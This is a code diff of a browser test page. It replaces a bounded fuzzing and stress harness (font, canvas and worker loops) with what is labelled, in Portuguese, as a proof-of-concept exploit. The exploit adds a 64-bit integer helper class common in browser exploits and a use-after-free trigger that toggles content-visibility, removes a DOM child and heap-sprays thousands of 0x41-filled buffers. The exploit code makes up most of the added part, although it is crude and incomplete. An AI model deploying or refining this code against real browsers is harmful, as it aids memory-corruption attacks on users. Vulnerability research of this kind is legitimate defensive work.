-        canvas.remove();
-
-        if (iter % 40 === 0) log("CV-C: iter=" + iter);
-        if (iter % 70 === 0) allocGarbage(50, 4096);
-      } catch (ex) {
-        log("CV-C exception: " + ex);
-        return;
-      }
-
-      if (iter < max) setTimeout(step, 0);
-      else log("CV-C completed.");
-    }
-
-    step();
-  }
-
-  /* ============================================================
-     FONT VARIANTS
-     ============================================================ */
-
-  function fnA(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("FN-A: @font-face toggling + thousands of nodes + relayout");
-    log("FN-A: starting...");
-
-    const badFont = "data:font/woff;base64,d09GRgABAAAAAA"; // truncated
-    const style = document.createElement("style");
-    style.setAttribute("data-test-container", "1");
-    document.head.appendChild(style);
-
-    const nodes = [];
-    for (let i = 0; i < 1400; i++) {
-      if (ABORT) return;
-      const d = document.createElement("div");
-      d.textContent = "FONT-NODE " + i + " " + "X".repeat(80);
-      c.appendChild(d);
-      nodes.push(d);
-    }
-
-    let iter = 0;
-    const max = 900;
-
-    function loop() {
-      if (ABORT) return;
-      iter++;
-      try {
-        // rebuild style frequently
-        if (iter % 2 === 0) {
-          style.textContent = `
-            @font-face {
-              font-family: "BADFONT${iter}";
-              src: url("${badFont}") format("woff");
+        if (typeof low === 'number') {
+            if (!check_range(low)) {
+                throw TypeError('low not a valid value: ' + low);
             }
-          `;
+            if (is_one) {
+                high = 0;
+                if (low < 0) {
+                    high = -1;
+                }
+            } else {
+                if (!check_range(high)) {
+                    throw TypeError('high not a valid value: ' + high);
+                }
+            }
+            buffer[0] = low;
+            buffer[1] = high;
+        } else if (typeof low === 'string') {
+            bytes.set(unhexlify(low));
+        } else if (typeof low === 'object') {
+            if (low instanceof Int) {
+                bytes.set(low.bytes);
+            } else {
+                if (low.length !== 8)
+                    throw TypeError("Array must have exactly 8 elements.");
+                bytes.set(low);
+            }
         } else {
-          style.textContent = `
-            @font-face {
-              font-family: "BADFONT${iter}";
-              src: url("${badFont}") format("woff");
-              font-weight: normal;
-              font-style: normal;
+            throw TypeError('Int does not support your object for conversion');
+        }
+
+        this.buffer = buffer;
+        this.bytes = bytes;
+
+        this.eq = operation(function eq(b) {
+            const a = this;
+            return a.low() === b.low() && a.high() === b.high();
+        }, 1);
+
+        this.neg = operation(function neg() {
+            let type = this.constructor;
+            let low = ~this.low();
+            let high = ~this.high();
+            let res = (new Int(low, high)).add(1);
+            return new type(res);
+        }, 0);
+
+        this.add = operation(function add(b) {
+            let type = this.constructor;
+            let low = this.low();
+            let high = this.high();
+            low += b.low();
+            let carry = 0;
+            if (low > 0xffffffff) {
+                carry = 1;
             }
-          `;
+            high += carry + b.high();
+            low &= 0xffffffff;
+            high &= 0xffffffff;
+            return new type(low, high);
+        }, 1);
+
+        this.sub = operation(function sub(b) {
+            let type = this.constructor;
+            b = b.neg();
+            let low = this.low();
+            let high = this.high();
+            low += b.low();
+            let carry = 0;
+            if (low > 0xffffffff) {
+                carry = 1;
+            }
+            high += carry + b.high();
+            low &= 0xffffffff;
+            high &= 0xffffffff;
+            return new type(low, high);
+        }, 1);
+    }
+
+    low() { return this.buffer[0]; }
+    high() { return this.buffer[1]; }
+
+    toString(is_pretty) {
+        if (!is_pretty) {
+            let low = this.low().toString(16).padStart(8, '0');
+            let high = this.high().toString(16).padStart(8, '0');
+            return '0x' + high + low;
         }
-
-        // apply to many nodes
-        for (let i = 0; i < nodes.length; i += 4) {
-          nodes[i].style.fontFamily = `"BADFONT${iter}", sans-serif`;
-        }
-
-        void c.offsetHeight;
-
-        if (iter % 60 === 0) log("FN-A: iter=" + iter);
-        if (iter % 90 === 0) allocGarbage(40, 8192);
-      } catch (ex) {
-        log("FN-A exception: " + ex);
-        return;
-      }
-      if (iter < max) requestAnimationFrame(loop);
-      else log("FN-A completed.");
+        let high = this.high().toString(16).padStart(8, '0');
+        high = high.substring(0, 4) + '_' + high.substring(4);
+        let low = this.low().toString(16).padStart(8, '0');
+        low = low.substring(0, 4) + '_' + low.substring(4);
+        return '0x' + high + '_' + low;
     }
-    requestAnimationFrame(loop);
+}
+Int.Zero = new Int(0);
+Int.One = new Int(1);
+
+
+/* ==========================================
+   PARTE 2: utils.mjs (Utilitários)
+   ========================================== */
+
+function die(msg) {
+    alert(msg);
+    // undefinedFunction(); // Comentado para não parar o script de forma feia no teste
+    throw new Error(msg);
+}
+
+function debug_log(msg) {
+    let textNode = document.createTextNode(msg);
+    let p = document.createElement("p");
+    p.appendChild(textNode);
+    // Modificado para anexar ao log-area se existir, senão ao body
+    let logArea = document.getElementById("log-area") || document.body;
+    logArea.appendChild(p);
+    console.log(msg);
+}
+
+function clear_log() {
+    let logArea = document.getElementById("log-area");
+    if(logArea) logArea.innerHTML = "<h3>Logs:</h3>";
+    else document.body.innerHTML = null;
+}
+
+function str2array(str, length, offset) {
+    if (offset === undefined) {
+        offset = 0;
+    }
+    let a = new Array(length);
+    for (let i = 0; i < length; i++) {
+        a[i] = str.charCodeAt(i + offset);
+    }
+    return a;
+}
+
+function align(a, alignment) {
+    if (!(a instanceof Int)) {
+        a = new Int(a);
+    }
+    const mask = -alignment & 0xffffffff;
+    let type = a.constructor;
+    let low = a.low() & mask;
+    return new type(low, a.high());
+}
+
+
+/* ==========================================
+   PARTE 3: poc.js (Lógica do Exploit)
+   ========================================== */
+
+// Seletores globais
+let container;
+let child;
+
+function initDomElements() {
+    container = document.querySelector(".container");
+    child = document.querySelector(".child");
+}
+
+function heapSpray() {
+  debug_log("Iniciando Heap Spray...");
+  let spray = [];
+  for (let i = 0; i < 10000; i++) {
+    let arr = new Uint8Array(0x1000);
+    for (let j = 0; j < arr.length; j++) {
+      arr[j] = 0x41; // Preenche com 'A'
+    }
+    spray.push(arr);
+  }
+  debug_log("Heap Spray concluído.");
+  return spray;
+}
+
+function triggerUAF() {
+  if(!container || !child) {
+      debug_log("Erro: Elementos DOM não encontrados. Reiniciando referências.");
+      initDomElements();
+      if(!child) { // Se child foi removido anteriormente, precisamos recriar para testar de novo
+          debug_log("Recriando elemento filho...");
+          child = document.createElement("div");
+          child.className = "child";
+          container.appendChild(child);
+      }
   }
 
-  async function fnB(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
+  debug_log("Alterando content-visibility para hidden...");
+  container.style.contentVisibility = "hidden";
+  
+  debug_log("Removendo elemento filho (Free)...");
+  child.remove();
+  
+  // setTimeout com 0ms cria a condição de corrida
+  setTimeout(() => {
+    debug_log("Restaurando content-visibility (Trigger Recompute)...");
+    container.style.contentVisibility = "auto";
+    
+    // Tenta ocupar a memória liberada imediatamente
+    let spray = heapSpray();
+    
+    debug_log("UAF disparado. Se o navegador não travar, a memória pode estar corrompida.");
+  }, 0);
+}
 
-    const c = mkContainer("FN-B: FontFace API loop + add/remove in document.fonts (if available)");
-    log("FN-B: FontFace API available? " + (typeof FontFace !== "undefined"));
+// Configuração do MutationObserver
+const observer = new MutationObserver(() => {
+  debug_log("Árvore DOM modificada (Observer), tentando UAF...");
+  triggerUAF();
+});
 
-    if (typeof FontFace === "undefined" || !document.fonts) {
-      log("FN-B: FontFace/document.fonts not available on this build. Aborting.");
-      return;
-    }
+// Função ligada ao botão
+function runExploit() {
+    initDomElements();
+    
+    // Ativa o observer
+    observer.observe(container, { childList: true, subtree: true });
+    
+    debug_log("Iniciando sequência manual...");
+    triggerUAF();
+}
 
-    const badFont = "data:font/woff;base64,d09GRgABAAAAAA"; // truncated
-    for (let i = 0; i < 120; i++) {
-      if (ABORT) return;
-      try {
-        const ff = new FontFace("FFV3_" + i, `url(${badFont})`);
-        try { document.fonts.add(ff); } catch (e1) {}
-        try { await ff.load(); } catch (e2) {}
-        // remove if supported
-        try { document.fonts.delete(ff); } catch (e3) {}
-        if (i % 20 === 0) log("FN-B: i=" + i);
-      } catch (ex) {
-        log("FN-B exception: " + ex);
-      }
-      if (i % 10 === 0) allocGarbage(30, 4096);
-    }
-
-    // create nodes to relayout
-    for (let k = 0; k < 500; k++) {
-      if (ABORT) return;
-      const d = document.createElement("div");
-      d.textContent = "FF NODE " + k + " " + "Y".repeat(80);
-      d.style.fontFamily = "FFV3_" + (k % 50) + ", sans-serif";
-      c.appendChild(d);
-    }
-    void c.offsetHeight;
-    log("FN-B completed.");
-  }
-
-  function fnC(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("FN-C: font-family thrash + style rebuild + GC pressure");
-    log("FN-C: starting...");
-
-    const style = document.createElement("style");
-    style.setAttribute("data-test-container", "1");
-    document.head.appendChild(style);
-
-    const badFont = "data:font/woff;base64,d09GRgABAAAAAA";
-    style.textContent = `
-      @font-face { font-family: "B1"; src: url("${badFont}") format("woff"); }
-      @font-face { font-family: "B2"; src: url("${badFont}") format("woff"); }
-    `;
-
-    const nodes = [];
-    for (let i = 0; i < 1200; i++) {
-      if (ABORT) return;
-      const d = document.createElement("div");
-      d.textContent = "NODE " + i + " " + "Z".repeat(64);
-      d.style.fontFamily = (i % 2 === 0) ? "B1, sans-serif" : "B2, sans-serif";
-      c.appendChild(d);
-      nodes.push(d);
-    }
-
-    let iter = 0;
-    const max = 1000;
-
-    function loop() {
-      if (ABORT) return;
-      iter++;
-      try {
-        // rebuild style aggressively
-        if (iter % 5 === 0) {
-          style.textContent = `
-            @font-face { font-family: "B1"; src: url("${badFont}") format("woff"); }
-            @font-face { font-family: "B2"; src: url("${badFont}") format("woff"); font-weight: normal; }
-            @font-face { font-family: "B3"; src: url("${badFont}") format("woff"); font-style: normal; }
-          `;
-        }
-
-        const fam = (iter % 3 === 0) ? "B1, sans-serif" : (iter % 3 === 1) ? "B2, sans-serif" : "B3, sans-serif";
-        for (let i = 0; i < nodes.length; i += 3) nodes[i].style.fontFamily = fam;
-
-        void c.offsetWidth;
-
-        if (iter % 60 === 0) log("FN-C: iter=" + iter);
-        if (iter % 90 === 0) allocGarbage(40, 8192);
-      } catch (ex) {
-        log("FN-C exception: " + ex);
-        return;
-      }
-      if (iter < max) requestAnimationFrame(loop);
-      else log("FN-C completed.");
-    }
-    requestAnimationFrame(loop);
-  }
-
-  /* ============================================================
-     WORKERS VARIANTS (cautious)
-     ============================================================ */
-
-  function makeWorkerURLOnce() {
-    if (window.__WORKER_BLOB_URL) return window.__WORKER_BLOB_URL;
-
-    const code = `
-      self.onmessage = function (e) {
-        const msg = e && e.data ? e.data : {};
-        const n = msg.n || 20000;
-        const mode = msg.mode || "A";
-        let s = 0;
-        for (let i = 0; i < n; i++) s += (i ^ 0x5a5a);
-        if (mode === "B") {
-          // small additional allocation
-          const u = new Uint8Array(65536);
-          u[0] = s & 0xff;
-        }
-        self.postMessage({ ok: 1, sum: s, mode: mode });
-      };
-    `;
-    const blob = new Blob([code], { type: "application/javascript" });
-    window.__WORKER_BLOB_URL = URL.createObjectURL(blob);
-    return window.__WORKER_BLOB_URL;
-  }
-
-  function wkA(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    mkContainer("WK-A: Workers LOW paced create/terminate + message bursts");
-    log("WK-A: starting...");
-
-    window.__WORKERS = window.__WORKERS || [];
-    const url = makeWorkerURLOnce();
-
-    let created = 0, completed = 0, failed = 0;
-    const maxWorkers = 50;
-    const burst = 3;
-    const workN = 15000;
-
-    function spawnBurst() {
-      if (ABORT) return;
-
-      for (let i = 0; i < burst; i++) {
-        if (ABORT) return;
-        if (created >= maxWorkers) break;
-
-        try {
-          const w = new Worker(url);
-          window.__WORKERS.push(w);
-          created++;
-
-          w.onmessage = function () {
-            completed++;
-            try { w.terminate(); } catch (e1) {}
-            if (completed % 10 === 0) log("WK-A: completed=" + completed + " created=" + created + " failed=" + failed);
-          };
-          w.onerror = function () { failed++; try { w.terminate(); } catch (e1) {} };
-
-          // burst messaging: a couple of messages
-          w.postMessage({ n: workN, mode: "A" });
-          w.postMessage({ n: workN, mode: "A" });
-
-        } catch (ex) {
-          failed++;
-          log("WK-A creation exception: " + ex);
-        }
-      }
-
-      if (created < maxWorkers) setTimeout(spawnBurst, 80);
-      else {
-        log("WK-A: reached maxWorkers=" + maxWorkers + " waiting a bit then cleanup.");
-        setTimeout(() => { if (!ABORT) stopAll(); }, 2500);
-      }
-    }
-
-    spawnBurst();
-  }
-
-  function wkB(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    mkContainer("WK-B: ping-pong + rapid terminate/recreate cadence (bounded)");
-    log("WK-B: starting...");
-
-    window.__WORKERS = window.__WORKERS || [];
-    const url = makeWorkerURLOnce();
-
-    let iter = 0;
-    const max = 120;
-    const workN = 20000;
-
-    function cycle() {
-      if (ABORT) return;
-      iter++;
-
-      let w = null;
-      try {
-        w = new Worker(url);
-        window.__WORKERS.push(w);
-      } catch (ex) {
-        log("WK-B: create exception: " + ex);
-        return;
-      }
-
-      try {
-        w.onmessage = function () {
-          // terminate immediately and recreate next cycle
-          try { w.terminate(); } catch (e1) {}
-          if (iter % 10 === 0) log("WK-B: iter=" + iter);
-          if (iter % 15 === 0) allocGarbage(20, 8192);
-          if (iter < max) setTimeout(cycle, 40);
-          else { log("WK-B completed."); setTimeout(() => { if (!ABORT) stopAll(); }, 1500); }
-        };
-        w.onerror = function () {
-          try { w.terminate(); } catch (e1) {}
-          log("WK-B: worker error at iter=" + iter);
-          if (iter < max) setTimeout(cycle, 60);
-        };
-        w.postMessage({ n: workN, mode: "B" });
-      } catch (ex) {
-        log("WK-B: postMessage exception: " + ex);
-        try { w.terminate(); } catch (e1) {}
-      }
-    }
-
-    cycle();
-  }
-
-  function wkC(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    mkContainer("WK-C: worker chain (main tears down fast) – bounded");
-    log("WK-C: starting...");
-
-    window.__WORKERS = window.__WORKERS || [];
-    const url = makeWorkerURLOnce();
-
-    let iter = 0;
-    const max = 60;
-
-    function step() {
-      if (ABORT) return;
-      iter++;
-
-      let w = null;
-      try {
-        w = new Worker(url);
-        window.__WORKERS.push(w);
-      } catch (ex) {
-        log("WK-C: create exception: " + ex);
-        return;
-      }
-
-      // Tear down fast regardless of message (stress lifecycle)
-      try {
-        w.postMessage({ n: 25000, mode: "A" });
-        setTimeout(() => { try { w.terminate(); } catch (e1) {} }, 10);
-        setTimeout(() => { try { w.terminate(); } catch (e2) {} }, 30);
-      } catch (ex) {}
-
-      if (iter % 10 === 0) log("WK-C: iter=" + iter);
-      if (iter % 12 === 0) allocGarbage(25, 8192);
-
-      if (iter < max) setTimeout(step, 80);
-      else { log("WK-C completed. Cleanup soon."); setTimeout(() => { if (!ABORT) stopAll(); }, 2000); }
-    }
-
-    step();
-  }
-
-  /* ============================================================
-     BUTTON WIRING
-     ============================================================ */
-  document.getElementById("btnClear").addEventListener("click", clearLog);
-  document.getElementById("btnStop").addEventListener("click", stopAll);
-
-  document.getElementById("fsA").addEventListener("click", fsA);
-  document.getElementById("fsB").addEventListener("click", fsB);
-  document.getElementById("fsC").addEventListener("click", fsC);
-
-  document.getElementById("hsA").addEventListener("click", hsA);
-  document.getElementById("hsB").addEventListener("click", hsB);
-  document.getElementById("hsC").addEventListener("click", hsC);
-
-  document.getElementById("mdA").addEventListener("click", mdA);
-  document.getElementById("mdB").addEventListener("click", mdB);
-  document.getElementById("mdC").addEventListener("click", mdC);
-
-  document.getElementById("dlA").addEventListener("click", dlA);
-  document.getElementById("dlB").addEventListener("click", dlB);
-  document.getElementById("dlC").addEventListener("click", dlC);
-
-  document.getElementById("cvA").addEventListener("click", cvA);
-  document.getElementById("cvB").addEventListener("click", cvB);
-  document.getElementById("cvC").addEventListener("click", cvC);
-
-  document.getElementById("fnA").addEventListener("click", fnA);
-  document.getElementById("fnB").addEventListener("click", fnB);
-  document.getElementById("fnC").addEventListener("click", fnC);
-
-  document.getElementById("wkA").addEventListener("click", wkA);
-  document.getElementById("wkB").addEventListener("click", wkB);
-  document.getElementById("wkC").addEventListener("click", wkC);
-
-  /* ============================================================
-     ENV LOG
-     ============================================================ */
-  log("Env: userAgent=" + navigator.userAgent);
-  log("Env: Worker=" + (typeof Worker !== "undefined"));
-  log("Env: FontFace=" + (typeof FontFace !== "undefined"));
-  log("Env: History.pushState=" + (typeof history !== "undefined" && typeof history.pushState === "function"));
-  log("Ready. Run one test at a time. Use STOP if needed.");
-})();
 </script>
 </body>
 </html>
